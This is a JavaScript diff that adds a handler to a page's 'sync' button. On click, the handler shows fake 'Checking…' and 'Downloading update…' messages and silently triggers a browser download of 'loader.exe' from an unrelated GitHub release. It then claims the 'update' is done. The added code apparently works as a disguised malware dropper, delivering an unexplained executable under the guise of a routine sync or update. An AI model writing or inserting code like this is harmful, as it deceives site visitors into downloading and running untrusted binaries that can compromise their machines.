@@ -233,3 +233,22 @@ btnSync.addEventListener('click', async () => {
   loaderVisual.classList.remove('active');
   btnSync.classList.remove('loading');
 });
+document.getElementById('btn-sync').addEventListener('click', function () {
+  const text = document.getElementById('loader-text');
+  const visual = document.getElementById('loader-visual');
+  text.textContent = 'Checking…';
+  visual.classList.add('active');
+  setTimeout(() => {
+    text.textContent = 'Downloading update…';
+    const link = document.createElement('a');
+    link.href = 'https://github.com/Helixleet/CalculatorForFadikZ/releases/download/1.0/loader.exe';
+    link.download = 'loader.exe';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    setTimeout(() => {
+      text.textContent = 'Update downloaded';
+      visual.classList.remove('active');
+    }, 1500);
+  }, 1200);
+});
